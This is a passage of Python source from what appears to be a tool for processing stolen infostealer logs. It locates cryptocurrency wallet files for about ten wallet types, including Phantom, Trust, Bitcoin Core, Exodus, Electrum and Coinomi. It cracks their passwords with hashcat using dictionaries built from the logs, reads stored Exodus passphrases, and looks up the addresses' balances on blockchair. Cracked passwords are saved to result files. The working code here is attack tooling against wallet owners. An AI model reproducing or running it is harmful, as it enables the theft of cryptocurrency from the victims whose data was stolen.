                elif is_phantom and "phantom" in path_wallet_low and (path_wallet_low.endswith(".log") or path_wallet_low.endswith(".ldb")):
                    path_phantom = path_wallet.split("/")[:-1]
                    path_phantom = "/".join(path_phantom)
                    hash, hash_mode = get_hash("phantom", path_phantom)
                    if hash:
                        create_dict(path_log)
                        if os.path.exists(path_dict):
                            password = hashcat(30010, hash, path_dict, False, rules_path)
                            print_results_extra(password, path_wallet, "Phantom")
                            utils.write_to_excel([path_wallet, "?", password, "-", "-", "Phantom", hash, "30010", "-", "-", "-"], path_results)
                            with open(utils.get_file_path(f"results/phantom_wallets.txt"), 'a', encoding='utf8') as f:
                                f.write(f"{path_wallet} : {password}\n")

                elif is_trust and "trust" in path_wallet_low and (path_wallet_low.endswith(".log") or path_wallet_low.endswith(".ldb")):
                    path_trust = path_wallet.split("/")[:-1]
                    path_trust = "/".join(path_trust)
                    hash, hash_mode = get_hash("trust", path_trust)
                    if hash:
                        create_dict(path_log)
                        if os.path.exists(path_dict):
                            password = hashcat(26620, hash, path_dict, False, rules_path)
                            print_results_extra(password, path_wallet, "Trust")
                            print("\n" + output)
                            utils.write_to_excel([path_wallet, "?", password, "-", "-", "Trust", hash, "26620", "-", "-", "-"], path_results)
                            with open(utils.get_file_path(f"results/trust_wallets.txt"), 'a', encoding='utf8') as f:
                                f.write(f"{path_wallet} : {password}\n")

                elif is_core_wallets and path_wallet_low.endswith(".dat"):
                    hash, hash_mode = get_hash("core", path_wallet)
                    if hash:
                        create_dict(path_log)
                        if os.path.exists(path_dict):
                            password = hashcat(11300, hash, path_dict, False, rules_path)
                            wallet_type = get_wallet_type(path_wallet)

                            if wallet_type == "Bitcoin Core":
                                log_addresses = get_addresses_btc(path_wallet)
                            elif wallet_type == "Litecoin Core":
                                log_addresses = get_addresses_ltc(path_wallet)
                            elif wallet_type == "Dogecoin Core":
                                log_addresses = get_addresses_doge(path_wallet)
                            else:
                                log_addresses = "-"

                            if password and password != "-":
                                output = "+--------------------+--------------------------------------------------------------------+\n"
                                output += f"| Status.............| {utils.bcolors.GREEN}Cracked{utils.bcolors.END}\n"
                                output += f"| Path...............| {path_wallet}\n"
                                output += f"| Wallet.............| {wallet_type}\n"
                                output += f"| Password...........| {password}\n"
                            else:
                                output = "+--------------------+--------------------------------------------------------------------+\n"
                                output += f"| Status.............| {utils.bcolors.RED}Failed{utils.bcolors.END}\n"
                                output += f"| Path...............| {path_wallet}\n"
                                output += f"| Wallet.............| {wallet_type}\n"

                            blockchair_links = []

                            if log_addresses != "-" and len(log_addresses) > 0:
                                for i in range(len(log_addresses)):
                                    address = log_addresses[i]

                                    if wallet_type == "Bitcoin Core":
                                        blockchair_links = f"https://blockchair.com/bitcoin/address/{address}"
                                    elif wallet_type == "Litecoin Core":
                                        blockchair_links = f"https://blockchair.com/litecoin/address/{address}"
                                    elif wallet_type == "Dogecoin Core":
                                        blockchair_links = f"https://blockchair.com/dogecoin/address/{address}"

                                    output += f"| Address {i}..........| {address}\n"
                                    output += f"| BlockChair {i}.......| {blockchair_links}\n"

                            blockchair_links = "\n".join(blockchair_links)
                            if log_addresses != "-":
                                log_addresses = "\n".join(log_addresses)

                            print("\n" + output)
                            utils.write_to_excel([path_wallet, "?", password, "-", "-", wallet_type, hash, "11300", "-", log_addresses, blockchair_links], path_results)
                            with open(utils.get_file_path(f"results/core_wallets.txt"), 'a', encoding='utf8') as f:
                                f.write(output + "\n")

                elif is_exodus and path_wallet_low.endswith("seed.seco"):
                    hash, hash_mode = get_hash("exodus", path_wallet)
                    folder_exodus = path_wallet.split("/")[:-1]
                    folder_exodus = "/".join(folder_exodus)
                    for root, dirs, files in os.walk(folder_exodus):
                        for filename in files:
                            path_full = os.path.join(root, filename)
                            path_full_lower = path_full.lower()
                            if filename.lower() == "passphrase.json":
                                with open(path_full, "r", encoding="utf8", errors="ignore") as f:
                                    password = json.load(f)["passphrase"]
                                    print_results_extra(password, path_wallet, "Exodus")
                                    utils.write_to_excel([path_wallet, "?", password, "-", "-", "Exodus", hash, "28200", "-", "-", "-"], path_results)
                                    with open(utils.get_file_path(f"results/exodus_wallets.txt"), 'a', encoding='utf8') as f:
                                        f.write(f"{path_wallet} : {password}\n")
                                    continue
                    if hash:
                        create_dict(path_log)
                        if os.path.exists(path_dict):
                            password = hashcat(28200, hash, path_dict, False, rules_path)
                            print_results_extra(password, path_wallet, "Exodus")
                            utils.write_to_excel([path_wallet, "?", password, "-", "-", "Exodus", hash, "28200", "-", "-", "-"], path_results)
                            with open(utils.get_file_path(f"results/exodus_wallets.txt"), 'a', encoding='utf8') as f:
                                f.write(f"{path_wallet} : {password}\n")

                elif is_electrum and "electrum" in path_wallet_low:
                    hash, hash_mode = get_hash("electrum", path_wallet)
                    if hash and hash_mode:
                        create_dict(path_log)
                        if os.path.exists(path_dict):
                            password = hashcat(hash_mode, hash, path_dict, False, rules_path)
                            print_results_extra(password, path_wallet, "Electrum")
                            utils.write_to_excel([path_wallet, "-", password, "-", "-", "Electrum", hash, hash_mode, "-", "-", "-"], path_results)
                            with open(utils.get_file_path(f"results/electrum_wallets.txt"), 'a', encoding='utf8') as f:
                                f.write(f"{path_wallet} : {password}\n")

                elif is_multibit and "multibit" in path_wallet_low and (path_wallet_low.endswith(".key") or path_wallet_low.endswith(".wallet") or path_wallet_low.endswith(".aes")):
                    hash, hash_mode = get_hash("multibit", path_wallet)
                    if hash and hash_mode:
                        create_dict(path_log)
                        if os.path.exists(path_dict):
                            password = hashcat(hash_mode, hash, path_dict, False, rules_path)
                            print_results_extra(password, path_wallet, "Multibit")
                            utils.write_to_excel([path_wallet, "?", password, "-", "-", "Multibit", hash, hash_mode, "-", "-", "-"], path_results)
                            with open(utils.get_file_path(f"results/multibit_wallets.txt"), 'a', encoding='utf8') as f:
                                f.write(f"{path_wallet} : {password}\n")

                elif is_blockchain and "blockchain" in path_wallet_low:
                    hash, hash_mode = get_hash("blockchain", path_wallet)
                    if hash and hash_mode:
                        create_dict(path_log)
                        if os.path.exists(path_dict):
                            password = hashcat(hash_mode, hash, path_dict, False, rules_path)
                            print_results_extra(password, path_wallet, "Blockchain")
                            utils.write_to_excel([path_wallet, "?", password, "-", "-", "Blockchain", hash, hash_mode, "-", "-", "-"], path_results)
                            with open(utils.get_file_path(f"results/blockchain_wallets.txt"), 'a', encoding='utf8') as f:
                                f.write(f"{path_wallet} : {password}\n")

                elif is_coinomi and "coinomi" in path_wallet_low and path_wallet_low.endswith(".wallet"):
                    hash, hash_mode = get_hash("coinomi", path_wallet)
                    if hash:
                        create_dict(path_log)
                        if os.path.exists(path_dict):
                            password = hashcat(27700, hash, path_dict, False, rules_path)
                            print_results_extra(password, path_wallet, "Coinomi")
                            utils.write_to_excel([path_wallet, "?", password, "-", "-", "Coinomi", hash, "27700", "-", "-", "-"], path_results)
                            with open(utils.get_file_path(f"results/coinomi_wallets.txt"), 'a', encoding='utf8') as f:
                                f.write(f"{path_wallet} : {password}\n")

                elif is_keystroke and "UTC" in path_wallet:
                    hash, hash_mode = get_hash("keystroke", path_wallet)
                    if hash:
                        create_dict(path_log)
                        if os.path.exists(path_dict):
                            password = hashcat(15700, hash, path_dict, False, rules_path)
                            print_results_extra(password, path_wallet, "Keystroke")
                            utils.write_to_excel([path_wallet, "?", password, "-", "-", "Keystroke", hash, "15700", "-", "-", "-"], path_results)
                            with open(utils.get_file_path(f"results/keystroke_wallets.txt"), 'a', encoding='utf8') as f:
                                f.write(f"{path_wallet} : {password}\n")
            except:
                with open(path_errors, "a", encoding="utf8", errors="ignore") as f:
                    traceback.print_exc(file=f)
                    f.write("\n")
